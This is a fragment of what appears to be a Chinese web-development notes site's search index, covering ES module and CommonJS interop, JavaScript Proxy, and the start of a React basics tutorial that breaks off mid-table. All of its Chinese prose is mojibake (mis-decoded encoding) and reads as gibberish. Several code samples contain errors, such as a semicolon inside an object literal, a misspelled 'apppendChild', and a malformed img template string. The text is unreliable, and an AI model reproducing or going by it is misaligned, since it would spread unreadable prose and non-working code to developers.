è¯­è¨€ä¸åº”è¯¥æ”¯æŒé¡¶çº§ await è¯­å¥ï¼š\n é¡¶çº§ await ä¼šé˜»ç¢ä»£ç çš„æ‰§è¡Œï¼›ä¼šé˜»ç¢èµ„æºçš„è·å–ï¼›commonjs æ²¡æœ‰ä¸ä¹‹å¯¹åº”çš„æ“ä½œã€‚  ES Module çš„ç¬¬ä¸‰æ¬¡ææ¡ˆé˜æ˜äº†è¿™äº›é—®é¢˜ï¼š\n å§Šå¦¹æ¨¡å—å¯ä»¥åŒæ—¶æ‰§è¡Œï¼Œå¹¶æ²¡æœ‰é˜»ç¢æ— é¡»ç­‰å¾…çš„ä»£ç ï¼›èµ„æºçš„è·å–åœ¨ç¬¬äºŒæ­¥ï¼Œä¹Ÿå°±æ˜¯ await æ“ä½œæ‰§è¡Œä¹‹å‰ï¼›await è¯­å¥ä»…ä»…é™äºè¢« ES Module ä½¿ç”¨ï¼Œæ²¡æœ‰å¿…è¦è€ƒè™‘ commonjs å¯¹åº”çš„æ“ä½œï¼›  åœ¨ nodejs/module çš„ issue ä¸­ç°åœ¨è¿˜æ´»è·ƒç€æœ‰å…³æ˜¯å¦åº”è¯¥åœ¨ ES Module ä¸­æ”¯æŒ require çš„è®¨è®ºï¼Œä½ ä¼šå‘ç°é¡¶çº§ await å¹¶ä¸å”¯ä¸€çš„é—®é¢˜ã€‚\nCJS can import ESM #  commonjs å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸å®Œç¾çš„æ–¹å¼ä» ES Module å¯¼å…¥å¯¹åº”çš„å‡½æ•°ï¼š\nmodule.exports.foo = (async () =\u0026gt; {  const {foo} = await import(\u0026#39;./foo.mjs\u0026#39;);  return foo; })(); ESM can\u0026rsquo;t import named CJS #  ESM å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼å¯¼å…¥ CJS ä¸­çš„é»˜è®¤å¯¼å‡ºï¼ˆä½†æ˜¯æ— æ³•å¯¼å…¥å‘½åå¯¼å…¥ï¼‰ï¼š\nimport _ from \u0026#39;./lodash.cjs\u0026#39;; è¿™æ˜¯å› ä¸ºä¹‹å‰æåˆ°çš„ CJS åªæœ‰åœ¨è„šæœ¬æ‰§è¡Œåæ‰å¯ä»¥æ˜ç¡®å®ƒå¯¼å‡ºçš„å†…å®¹ï¼Œè€Œ ESM éœ€è¦åœ¨åˆ†æé˜¶æ®µã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼å¯¼å…¥ï¼š\nimport _ from \u0026#39;./lodash.cjs\u0026#39;; const {shuffle} = _; è§£å†³è¿™ä¸ªé—®é¢˜æœ‰å¾ˆå¤šæ€è·¯ï¼Œä½†æ˜¯éƒ½æœ‰å¾ˆå¼ºçš„å‰¯ä½œç”¨ï¼š\n  å¿½ç•¥é¡ºåºï¼Œå°†æ‰€æœ‰çš„ CJS æ¨¡å—åœ¨ ESM å‰æ‰§è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½åœ¨ ESM çš„åˆ†æé˜¶æ®µå¾—åˆ° CJS çš„å¯¼å‡ºç»“æœã€‚ä½†æ˜¯è¿™äº§ç”Ÿäº†æ–°é—®é¢˜ï¼Œå¦‚æœæ¨¡å—æœ‰æ˜æ˜¾çš„å…ˆåå…³ç³»ï¼Œåˆ™è¿™ç§è§£å†³æ–¹å¼å°†å¯¼è‡´ä»¤äººä½œå‘•çš„ bugï¼ˆnauseatingly problematicï¼‰ï¼›\n  æˆ‘ä»¬å¯ä»¥ä¿æŒé¡ºåºï¼Œè¿˜æœ‰å¦ä¸€ç§è§£å†³æ–¹æ¡ˆçš„ææ¡ˆï¼Œå«åš \u0026ldquo;åŠ¨æ€æ¨¡å—\u0026quot;ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆä½¿å¾— ESM å¯ä»¥ä½¿ç”¨å¦‚ export * from './foo.cjs' è¿™æ ·çš„è¯­æ³•è¿›è¡Œå¯¼å‡ºã€‚ä½†æ˜¯è¿™ä¸ªææ¡ˆå› ä¸ºç§ç§åŸå› è¢«æ‹’ç»äº†ã€‚\n  ESM can require CJS #  ESM å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼éå¸¸è½»æ¾åœ°ä» CJS ä¸­ requireï¼š\nimport { createRequire } from \u0026#39;module\u0026#39;; const require = createRequire(import.meta.url);  const {foo} = require(\u0026#39;./foo.cjs\u0026#39;); è™½ç„¶è¿™ä¹ˆåšéå¸¸å®Œç¾ï¼Œä½†æ˜¯ç›¸å¯¹äºä¹‹å‰çš„ import æ›´éº»çƒ¦ï¼Œæ²¡æœ‰å¿…è¦è¿™ä¹ˆåšã€‚\nAwareness In Use #  åœ¨ä½¿ç”¨æ—¶æˆ‘ä»¬éœ€è¦æ³¨æ„ä»¥ä¸‹çš„ä¸€äº›åŒºåˆ«ï¼š\n  CJS è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒESM è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ã€‚\n  CJS æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒESM æ˜¯ç¼–è¯‘æ—¶è¾“å‡ºæ¥å£ï¼›\n  CJS æ˜¯å•ä¸ªå€¼å¯¼å‡ºï¼ŒESM å¯ä»¥å¯¼å‡ºå¤šä¸ªï¼›\n  CJS æ˜¯åŠ¨æ€è¯­æ³•å¯ä»¥å†™åœ¨åˆ¤æ–­é‡Œï¼ŒESM é™æ€è¯­æ³•åªèƒ½å†™åœ¨é¡¶å±‚ï¼›\n  CJS çš„ this æŒ‡å‘å½“å‰æ¨¡å—ï¼ŒESM çš„ this æ˜¯ undefinedï¼›\n  "},{"id":87,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/proxy/","title":"Proxy","section":"JavaScript","content":" å‚è€ƒèµ„æ–™ï¼š\n https://zhuanlan.zhihu.com/p/75407419 https://zhuanlan.zhihu.com/p/69106037   Proxy #  å®ä¾‹ #  ç›´æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š\nlet target = { x: 10, y: 20, }; let hanler = { get: (obj, prop) =\u0026gt; 42 }; target = new Proxy(target, hanler);  target.x; //42 target.y; //42 "},{"id":88,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/1.react%E5%9F%BA%E7%A1%80/","title":"1. ReactåŸºç¡€","section":"reactjs","content":"React åŸºç¡€ #  ä»åŸç”Ÿåˆ° React #  åŸç”Ÿä¾‹å­ #  ä¸€ä¸ª demoï¼Œå¦‚ä½•ç”¨åŸç”Ÿçš„ JavaScript å®ç°ä¸€ä¸ªç‚¹èµæŒ‰é’®ï¼ˆå³ç®€å•çš„ç‚¹å‡»ä¸€æ¬¡æ›´æ¢ä¸€æ¬¡å›¾ç‰‡ï¼‰ã€‚\n// å°†ç‚¹èµæŒ‰é’®å¯å¤ç”¨åœ°ç»„ä»¶åŒ– class LikeStar {  constructor() {  this.state = { isLiked: false; }  this.redStarSrc = URL_OF_RED_STAR;  this.whiteStarSrc = URL_OF_WHITE_STAR;  }   changeStar = () =\u0026gt; {  this.state.isLiked = !this.state.isLiked;  const imgSrc = this.state.isLiked ? this.redStarSrc : this.whiteStarSrc;  const $star = this.el.querySelector(\u0026#39;.js-star\u0026#39;);\t// å…¶ä¸­ js-star æ˜¯ img æ ‡ç­¾çš„ä¸€ä¸ª class  $star.setAttribute(\u0026#39;src\u0026#39;, imgSrc);  }   render() {  this.el = createDOMFromString(`\u0026lt;img class=\u0026#34;js-star\u0026#34;\u0026gt; src=\u0026#34;${this.whiteStarSrc}\u0026#34;`);  this.el.addEventListener(\u0026#39;click\u0026#39;, this.changeStar, false);  return this.el;  } }  // å¦‚ä½•ä½¿ç”¨åˆšæ‰å®šä¹‰çš„ LikeStar ç±» $wrapper.apppendChild(new LikeStar().render()); ä¸Šé¢çš„ä¾‹å­ä½¿ç”¨äº† setAttributeã€createDOMFromStringã€addEventListener è¿™äº›åŸç”Ÿçš„ js æ–¹æ³•ï¼Œå®ç°äº†ä¸€ä¸ª demoã€‚\nåŸç”Ÿå­˜åœ¨çš„é—®é¢˜ #  ä¸Šé¢ç›´æ¥ä½¿ç”¨åŸç”Ÿçš„æ–¹æ³•å®ç°çš„ä¾‹å­å­˜åœ¨è¿™æ ·ä¸€äº›é—®é¢˜ï¼š\n å¤ç”¨æ€§ä¸æ˜¯ç‰¹åˆ«å¼ºï¼šç»„ä»¶æ²¡æœ‰æä¾›ä¼ å…¥å‚æ•°å®šåˆ¶åŒ–çš„èƒ½åŠ›ï¼Œå¤ç”¨æ€§ä¸å¼ºã€‚ DOM æ“ä½œä¸ç»„ä»¶æ–¹æ³•è€¦å’Œåœ¨ä¸€èµ·ï¼šå½“æˆ‘ä»¬çš„ç»„ä»¶è¶Šæ¥è¶Šå¤æ‚æ—¶ï¼Œéœ€è¦åœ¨ç»„ä»¶å†…ç»´æŠ¤ DOM çš„æˆæœ¬ä¼šè¶Šæ¥è¶Šå¤§ï¼ŒåŒæ—¶ç›´æ¥æ“ä½œ DOM ä¹Ÿä¼šæœ‰è®¸å¤šæ€§èƒ½é—®é¢˜ï¼›å®ƒåŒæ—¶ä¹Ÿæ˜¯å¤ç”¨æ€§ä¸å¼ºçš„ä¸€ç§å…·ä½“ä½“ç°ï¼›  ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯æ¯”è¾ƒå¥½è§£å†³çš„ï¼Œç›´æ¥åœ¨ class çš„æ„é€ æ–¹æ³•ä¸­åŠ å…¥ä¸€ä¸ª props å‚æ•°å³å¯ã€‚\nå¯¹äºç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åˆ™éœ€è¦é€šè¿‡ä¸€å®šçš„æŠ½è±¡ï¼Œå°†ä¸ DOM ç›¸å…³çš„æ“ä½œä» LikeStar ä¸­å‰¥ç¦»å‡ºæ¥ï¼š\nclass DOMOperator {  constructor(props) {  this.state = {};  this.props = props || {};  }  setState = state =\u0026gt; {  this.state = state;  const oldEle = this.el;  this.el = this.renderDOM()  this.updateUI \u0026amp;\u0026amp; this.updateUI(oldEle, this.el);  }  renderDOM = () =\u0026gt; {  this.el = createDOMFromString(this.render());  this.onClick \u0026amp;\u0026amp; this.el.addEventListener(\u0026#39;click\u0026#39;, this.onClick, false);  return this.el;  } }  class LikeStar extends DOMOperator {  constructor(props) {  super(props);  this.state = { isLiked: false; }  }  onClick = () =\u0026gt; {  this.setState({ isLiked: !this.state.isLiked })  }  render() {  const { isLiked } = this.state;  const { className } = this.props;  const imgSrc = isLiked ? URL_OF_RED_STAR : URL_OF_WHITE_STAR;  return createDOMFromString(`\u0026lt;img class=\u0026#34;js-star ${className}\u0026#34;\u0026gt; src=\u0026#34;${imgSrc}\u0026#34;`);  } }  const renderDOM = (instance, $parentDOM) =\u0026gt; {  instance.updateUI = (oldEle, newEle) =\u0026gt; {  $parentDOM.insertBefore(newEle, oldEle); \t$parentDOM.removeChild(oldEle);  }  $parentDOM.appendChild(instance.renderDOM()); } renderDOM( new LikeStar(), $wrapper ); ä¸Šé¢çš„ä¾‹å­é€šè¿‡å°† setState ä¸ updateDOM æ²‰æ·€åˆ°åŸºç±»ä¸­å®ç°äº†ä¸€ä¸ª DOM ä¸ç»„ä»¶éš”ç¦»çš„è®¾è®¡æ¨¡å¼ã€‚å¯¹äºä¸Šé¢çš„è®¾è®¡æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸º UI çš„ä¸€ä¸ªæ›´æ–°æµç¨‹çš„æŠ½è±¡è¿‡ç¨‹ï¼š\n æ›´æ–°çŠ¶æ€ setState =\u0026gt; æ›´æ–°æŠ½è±¡çš„ DOM =\u0026gt; æ›´æ–° UIï¼›  React ä¾‹å­ #  åŒæ ·çš„ä¾‹å­ï¼Œç”¨ React æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ\nclass LikeStar extends React.Component {  constructor(props) {  super(props);  this.state = { isLiked: false };  }  onClick = () =\u0026gt; {  this.setState(prev =\u0026gt; ({ isLiked: !prev.isLiked }));  }  render() {  const { isLiked } = this.state;  const { className } = this.props;  const imgSrc = isLiked ? URL_OF_RED_STAR : URL_OF_WHITE_STAR;  return (  \u0026lt;img className={\u0026#39;heart \u0026#39; + className} onClick={this.onClick} src={imgSrc} /\u0026gt;  );  } } è€Œæœ€åæŠ½è±¡å‡ºæ¥çš„ renderDOM æ–¹æ³•åˆ™æ˜¯ç”±ä¸€ä¸ªå« ReactDOM çš„ç¬¬ä¸‰æ–¹åº“å®ç°çš„ï¼š\nReactDOM.render( \u0026lt;LikeStar /\u0026gt;, $wrapper ); å¯ä»¥çœ‹åˆ°è¿™ä¸ªä¾‹å­å°±ä¸æˆ‘ä»¬åœ¨ç¬¬äºŒä¸ªéƒ¨é—¨ä¸­ä¼˜åŒ–åçš„ä»£ç å‡ ä¹æ˜¯ä¸€è‡´çš„äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒReact ç›¸å¯¹äºåŸç”Ÿä»£ç è§£å†³äº†ä»¥ä¸‹çš„é—®é¢˜ï¼š\n ä½¿ç”¨é¢å‘å¯¹è±¡çš„ç»„ä»¶åŒ–çš„æ–¹å¼é¡¹ç›®åŒ–åœ°ç»„ç»‡ä»£ç ç»“æ„ï¼› é€šè¿‡ä½¿ç”¨ propsã€state è¿™ä¸¤ä¸ªæ ¸å¿ƒæŠ€æœ¯ï¼Œå®ç°ç»„ä»¶çš„å¤šæ€æ€§ï¼Œæé«˜ä»£ç çš„å¤ç”¨æ€§ï¼› å°† DOM æ“ä½œä¸ç»„ä»¶çš„é€»è¾‘é€šè¿‡ setState è¿™ä¸ªæ–¹æ³•è§£è€¦ï¼Œè¿™ä¸ªæ˜¯ React è®¾è®¡çš„æ ¸å¿ƒä¼˜ç‚¹ï¼Œå®ƒæœ‰ä»¥ä¸‹å¥½å¤„ï¼š  è§£å†³äº†å½“ç»„ä»¶è¿‡äºåºå¤§æ—¶å¤§é‡å¤„ç† DOM çš„é—®é¢˜ï¼Œæé«˜äº†ä»£ç çš„ç»´æŠ¤æ€§ï¼› React.js åº•å±‚é€šè¿‡è™šæ‹Ÿ DOM çš„æ–¹å¼æé«˜äº† DOM æ¸²æŸ“çš„æ€§èƒ½ï¼› æä¾›äº†ä¸€ä¸ªç»„ä»¶çš„è®¾è®¡èŒƒå¼ï¼Œä¼˜åŒ–äº†ä»£ç çš„ç¼–å†™æ–¹å¼ï¼›   é€šè¿‡å®šä¹‰ jsx è¯­æ³•ï¼Œå®ç° js/html çš„é«˜æ•ˆåµŒå¥—ç¼–å†™ï¼ˆæœ¬è´¨æ˜¯ React.createElement çš„è¯­æ³•ç³–ï¼‰ï¼›  ç®€ä»‹ #  ä»€ä¹ˆæ˜¯ React.jsï¼Ÿ\n React æ˜¯ä¸€ä¸ªå£°æ˜å¼ï¼Œé«˜æ•ˆä¸”çµæ´»çš„ç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„ JavaScript åº“ã€‚ ä¸åŒäºæ¡†æ¶ï¼Œæ¡†æ¶æä¾›äº†ä¸€æ•´å¥—çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œ React çš„å®šä½åªæ˜¯ä¸€ä¸ªè½»é‡åº“ã€‚ React.js åªæœ‰ä¸ Reduxã€react-router åˆèµ·æ¥æ‰èƒ½ç§°ä¸ºä¸€ä¸ªæ¡†æ¶ã€‚  React.js çš„ç‰¹ç‚¹ï¼š\n  å£°æ˜å¼çš„è§†å›¾å±‚ï¼šå£°æ˜å¼ä¾§é‡äºæè¿°ä¸€ä¸ªç»„ä»¶çš„ç‰¹ç‚¹ï¼Œè€Œä¼ ç»Ÿçš„å‘½ä»¤å¼åˆ™ä¾§é‡äºå…·ä½“çš„å®ç°è¿‡ç¨‹ï¼›\n  ç®€å•çš„æ›´æ–°æµç¨‹ï¼šåªéœ€è¦è°ƒç”¨ setState å³å¯ï¼Œä¹Ÿå°±è¯´ React å®ç°äº†æ•°æ®æ›´æ–°åˆ° UI æ›´æ–°çš„å•å‘æ›´æ–°æœºåˆ¶ï¼›\n  çµæ´»çš„æ¸²æŸ“å®ç°ï¼šReact.js é€šè¿‡è™šæ‹Ÿ DOM ä½œä¸ºè§†å›¾ç»„ä»¶åˆ° UI çš„ä¸­ä»‹ï¼ŒReact ä¸å…³å¿ƒ è™šæ‹Ÿ DOM åˆ°æ›´æ–° UI çš„å…·ä½“å®ç°ï¼Œè¿™ä¸€è¿‡ç¨‹éœ€è¦é€šè¿‡ç¬¬ä¸‰æ–¹åº“å…·ä½“åœ°å®ç°ã€‚æ¯”å¦‚ï¼šreact-dom ç”¨äºæµè§ˆå™¨æ¸²æŸ“ã€React-Native ç”¨äºæ‰‹æœºç»ˆç«¯æ¸²æŸ“ï¼›\n  é«˜æ•ˆçš„ DOM æ“ä½œï¼šåªæ“ä½œ è™šæ‹Ÿ DOMï¼ˆä¸€ä¸ª JavaScript å¯¹è±¡ï¼‰ è€Œéå…·ä½“çš„ DOMï¼Œä¼˜å¼‚çš„ DOM diff ç®—æ³•ã€‚\n  åŸºæœ¬æ¦‚å¿µ #  jsx è¯­æ³• #  æ ‡ç­¾ç±»å‹ï¼š\n DOM ç±»å‹æ ‡ç­¾ï¼ˆé¦–å­—æ¯å¿…é¡»å°å†™å¼€å¤´ï¼‰ï¼šReact.js ä¸ºäº†ä¼˜åŒ–å¼€å‘ä½“éªŒï¼Œä½¿ç”¨äº†åŸç”Ÿçš„ DOM æ ‡ç­¾è¿›è¡Œå®šä¹‰ã€‚å®é™…ä¸Šåœ¨ React.js åº•å±‚è¿›è¡Œäº†ä¸€å±‚å¤„ç†ï¼› React ç»„ä»¶ç±»å‹æ ‡ç­¾ï¼ˆé¦–å­—æ¯å¿…é¡»å¤§å†™å¼€å¤´ï¼‰ï¼šjsx ä½¿ç”¨ä¸åŒçš„å¤„ç†æ–¹å¼ï¼Œå› æ­¤éœ€è¦äºä¸Šè€…ä¸¥æ ¼åŒºåˆ†ã€‚  jsx ä¸­çš„ JavaScript è¡¨è¾¾å¼ï¼š\n å¯ä»¥é€šè¿‡è¡¨è¾¾å¼ç»™æ ‡ç­¾èµ‹å€¼ï¼Œå¯ä»¥é€šè¿‡è¡¨è¾¾å¼å®šä¹‰å­ç»„ä»¶ï¼ˆæ¯”å¦‚å®šä¹‰å¾ªç¯ï¼‰ï¼› éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ jsx æ˜¯ä¸æ”¯æŒå¤šè¡Œè¡¨è¾¾å¼çš„ï¼Œå› æ­¤éœ€è¦å°†è¡¨è¾¾å¼æŠ½è±¡æˆä¸€ä¸ªæ–¹æ³•å‡ºæ¥ï¼›  DOM æ ‡ç­¾å±æ€§ï¼š\n class =\u0026gt; classNameï¼šä¸ºäº†é¿å…ä¸ ES6 çš„ class å‘ç”Ÿå†²çªï¼ŒDOM ä¸­çš„ class å…³é”®å­—åœ¨ React ä¸­è¢«å‘½åä¸º classNameã€‚ onclick =\u0026gt; onClickï¼šä¸ºäº†ä¿æŒç¼–ç é£æ ¼çš„ä¸€è‡´æ€§ï¼Œéƒ½æ”¹åä¸ºé©¼å³°çš„å‘½åæ–¹å¼ï¼ŒåŒç†è¿˜æœ‰ onFocusã€onBlur ç­‰ï¼› è‡ªå®šä¹‰æ ‡ç­¾å±æ€§ï¼šå–å†³äºç»„ä»¶çš„ propsã€‚PSï¼šåœ¨ jsx ä¸­ä½¿ç”¨ 'str' ä¸ {'str'} å®šä¹‰å­—ç¬¦ä¸²éƒ½æ˜¯åˆæ³•çš„ï¼Œå»ºè®®ä½¿ç”¨å‰è€…ï¼›  ç»„ä»¶ #  ç»„ä»¶çš„ç±»å‹ï¼š\n ç±»ç»„ä»¶ï¼ˆä½¿ç”¨ ES6 çš„ class è¯­æ³•ï¼‰ï¼Œå‡½æ•°ç»„ä»¶ï¼ˆæ¥æ”¶ props ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ª ReactNodeï¼Œæ³¨æ„é¦–å­—æ¯éœ€è¦å¤§å†™ï¼‰ï¼› å»ºè®®æœ‰çŠ¶æ€ç»„ä»¶ä½¿ç”¨ç±»ç»„ä»¶çš„å®šä¹‰æ–¹å¼ï¼Œæ— çŠ¶æ€ç»„ä»¶ä½¿ç”¨å‡½æ•°ç»„ä»¶çš„å®šä¹‰æ–¹å¼ã€‚  props å±æ€§çš„æ ¡éªŒï¼š\n React.Component æ”¯æŒå¯¹ props è¿›è¡Œæ ¡éªŒï¼ˆæ ¡éªŒç»“æœæ˜¯åœ¨æ§åˆ¶å°æŠ›å‡º warningï¼‰ï¼Œæ ¡éªŒçš„æ–¹å¼æ˜¯é€šè¿‡å®šä¹‰ä¸€ä¸ª static çš„æˆå‘˜å¯¹è±¡ propTypesï¼ŒReact æ”¯æŒçš„æ‰€æœ‰ç»„ä»¶éƒ½å®šä¹‰åœ¨ä¸€ä¸ªå« prop-types çš„ç¬¬ä¸‰æ–¹åº“ä¸­ã€‚ å¦å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å®šä¹‰ static çš„æˆå‘˜å¯¹è±¡ defaultProps ç»™æ¯ä¸ª prop èµ‹äºˆä¸€ä¸ªé»˜è®¤å€¼ã€‚  ä¸‹é¢ç»™å‡ºä¸€ä¸ª props å±æ€§æ ¡éªŒçš„ä¾‹å­ï¼š\nimport PropTypes from \u0026#39;prop-types\u0026#39;  class CommentItems extends React.Component {  static propTypes = {  userImg: PropTypes.string.isRequired, // å¿…é€‰å­—ç¬¦ä¸²é¡¹  likeIcon: PropTypes.number,\t// æ•°å­—ç±»å‹  } \tstatic defaultProps = { userImg: \u0026#39;\u0026#39;, likeIcon: 0, } } state æ›´æ–°ï¼š\n state æ›´æ–°ä¸èƒ½ç›´æ¥èµ‹å€¼ï¼Œéœ€è¦ä½¿ç”¨ setState æ–¹æ³•è¿›è¡Œæ›´æ–°ï¼› setState æ–¹æ³•æœ‰ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œä¸€ç§æ˜¯ç›´æ¥ä¼ å…¥å¯¹è±¡ï¼Œä¸€ç§æ˜¯ä¼ å…¥ä»¥ (prevState, props) ä¸ºå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼› setState è°ƒç”¨åå¹¶ä¸ä¼šç«‹å³æ›´æ–°ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç»„ä»¶ç”Ÿå‘½ä¹‹åå°†æ‰€æœ‰æ›´æ”¹æ‰¹é‡æ›´æ–°ï¼Œå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ callback å‡½æ•°ã€‚  ç»„ä»¶æ ·å¼çš„ç¼–å†™ï¼š\n React æä¾›äº†ä½¿ç”¨ classNameï¼ˆå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ classnamesï¼‰ å’Œ css-in-js ä¸¤ç§æ–¹å¼å¯¹ç»„ä»¶æ ·å¼è¿›è¡Œæ›´æ–°ï¼› å®˜æ–¹æ¨èä½¿ç”¨ className è¿™ç§ç®€å•æ–¹å¼è¿›è¡Œæ ·å¼ç¼–å†™ï¼Œcss-in-js åº”è¯¥åªåœ¨ç‰¹å®šåœºæ™¯ä¸‹ä½¿ç”¨ï¼›  å…ƒç´  #  å…ƒç´ ï¼š\n å…ƒç´ æ˜¯ React ä¸­æœ€å°çš„ç»„æˆå•å…ƒï¼Œå®ƒç›´æ¥æè¿°äº†å¸Œæœ›çœ‹åˆ°çš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹åº“ç›´æ¥æ¸²æŸ“æˆä¸€ä¸ª DOM å…ƒç´ ï¼› React ä¸­çš„å…ƒç´ æ˜¯ä¸å¯å˜å¯¹è±¡ï¼Œè¿™æ„å‘³ç€å®ƒå’Œå®ƒçš„å­å…ƒç´ éƒ½æ˜¯ä¸å¯å˜çš„ï¼Œåœ¨æ›´æ–°æ—¶ä½¿ç”¨åˆ›å»ºä¸€ä¸ªæ–°çš„å…ƒç´ çš„ç­–ç•¥è¿›è¡Œæ›´æ–°ï¼›  ç»„åˆå’Œå…ƒç´ ï¼ˆReact.Component ä¸ React.Elementï¼‰ï¼š\n ç»„ä»¶æœ€æ ¸å¿ƒçš„ä½œç”¨æ˜¯è¿”å› React å…ƒç´ ã€‚ class ç±»å‹çš„ç»„ä»¶ä¸­çš„ render æ–¹æ³•è¿”å›çš„å°±æ˜¯å…ƒç´ ï¼Œfunction æœ¬èº«è¿”å›çš„ä¹Ÿæ˜¯å…ƒç´ ã€‚  ä¸€ä¸ªåŒºåˆ«äºŒè€…çš„ä¾‹å­ï¼š\n\u0026lt;Parent\u0026gt; \u0026lt;Children\u0026gt;æˆ‘æ˜¯å­ç»„ä»¶\u0026lt;/Children\u0026gt; \u0026lt;/Parent\u0026gt; æˆ‘ä»¬çŸ¥é“ children ä¼šè¢«æŒæœ‰åœ¨ parent çš„ props ä¸­ï¼š\nimport Children from \u0026#39;./Children\u0026#39;  class Parent extends React.Component {  /* æ­£ç¡®çš„ç¼–å†™æ–¹å¼ 1 */  render() {  const { tip } = this.props;  return \u0026lt;Children tip={tip} /\u0026gt;\t/// =\u0026gt; å› ä¸º Children æ˜¯ç»„ä»¶  }   /* é”™è¯¯çš„ç¼–å†™æ–¹å¼ 2 */  render() {  const { tip, children } = this.props;  return \u0026lt;children tip={tip} /\u0026gt;\t/// =\u0026gt; å› ä¸º children æ˜¯å…ƒç´   }   /* æ­£ç¡®çš„ç¼–å†™æ–¹å¼ 3 */  render() {  const { tip, children } = this.props;  return React.cloneElement(children, { tip });  } } ç”Ÿå‘½å‘¨æœŸä¸äº‹ä»¶å¤„ç† #  æŒ‚è½½é˜¶æ®µ #  ä¸‹è¿°æ–¹æ³•ä»ä¸Šå¾€ä¸‹ä»¥æ­¤è°ƒç”¨ï¼š\n   æ–¹æ³• ä¸€èˆ¬ä½œç”¨ è°ƒç”¨æ—¶æœºä¸æ•ˆæœ     constructor(props) 1. state çš„åˆå§‹åŒ–ï¼Œç›´æ¥èµ‹å€¼è€Œéä½¿ç”¨ setStateï¼›\n2. é€šè¿‡ bind è¿›è¡Œæ–¹æ³•ç»‘å®šï¼› ES6 class çš„åˆå§‹åŒ–æ–¹æ³•   static getDerivdStateProps(props, state) =\u0026gt; obj or null è®©ç»„ä»¶åœ¨ props å˜åŒ–æ—¶æ›´æ–° stateã€‚ æ¯æ¬¡æ‰§è¡Œæ¸²æŸ“å‰éƒ½ä¼šè°ƒç”¨ã€‚\nå¦‚æœè¿”å›å€¼è®¾ä¸º obj é‚£ä¹ˆæ‰§è¡Œä¹‹åç»„ä»¶çš„ state ä¼šè¢«è®¾ç½®ä¸º {...this.state, ...obj}ï¼›   renderï¼šå”¯ä¸€å¿…é¡»è¦å®ç°çš„æ–¹æ³•ã€‚ æè¿°å¸Œæœ›åœ¨é¡µé¢ä¸Šçœ‹åˆ°çš„ UI æ•ˆæœ è¿”å›ç±»å‹ï¼šå…ƒç´ ã€æ•°ç»„/fragmentsã€Porrtalsã€å­—ç¬¦ä¸²æˆ–æ•°å€¼ã€å¸ƒå°”å‹æˆ– nullã€‚   componentDidMount 1. ä¾èµ–äº DOM èŠ‚ç‚¹çš„åˆå§‹åŒ–çš„ä»»åŠ¡ï¼›\n2. éœ€è¦é€šè¿‡ç½‘ç»œè¯·æ±‚è·å–æ•°æ®ï¼› åœ¨ç»„ä»¶æŒ‚è½½ï¼ˆå³æ’å…¥ DOM æ ‘ï¼‰ä¹‹åç«‹å³è°ƒç”¨ã€‚    æ›´æ–°é˜¶æ®µ #  ç»„ä»¶çš„æ›´æ–°éœ€è¦å¤–éƒ¨çš„è§¦å‘ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼šprops æ›´æ–°ã€setState æ–¹æ³•è°ƒç”¨ã€forceUpdate æ–¹æ³•è°ƒç”¨ã€‚\nåœ¨ç»„ä»¶æ›´æ–°è§¦å‘æ—¶ï¼Œä¸‹é¢çš„æ–¹æ³•ä»ä¸Šå¾€ä¸‹ä¾æ¬¡è°ƒç”¨ï¼š\n   æ–¹æ³• ä¸€èˆ¬ä½œç”¨ è°ƒç”¨æ—¶æœºä¸æ•ˆæœ     static getDerivdStateProps(props, state) =\u0026gt; obj or null  æ³¨æ„å‚æ•°æ˜¯æ›´æ–°ä¹‹åçš„å€¼   shouldComponentUpdate(nextProps, nextState) =\u0026gt; bool å†³å®šç»„ä»¶æ˜¯å¦ç»§ç»­æ‰§è¡Œæ›´æ–°è¿‡ç¨‹ è¿”å›çš„å€¼å¦‚æœæ˜¯ falseï¼Œåˆ™ç»„ä»¶ä¸ä¼šç»§ç»­æ‰§è¡Œåç»­å‡½æ•°çš„æ›´æ–°è¿‡ç¨‹ï¼ˆforceUpdate æ—¶ä¼šè·³è¿‡è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œï¼‰   render     getSnapshotBeforeUpdate(prevProps, prevState) =\u0026gt; snapshot or null éœ€è¦åœ¨æ›´æ–° DOM å‰ä¿å­˜å½“å‰ DOM ä¸€äº›çŠ¶æ€å€¼æ—¶ä½¿ç”¨ åœ¨æœ€è¿‘ä¸€æ¬¡æ¸²æŸ“è¾“å‡ºï¼ˆå³æäº¤åˆ° DOM èŠ‚ç‚¹ï¼‰å‰è°ƒç”¨   componentDidUpdate(prevProps, prevState, snapshot) 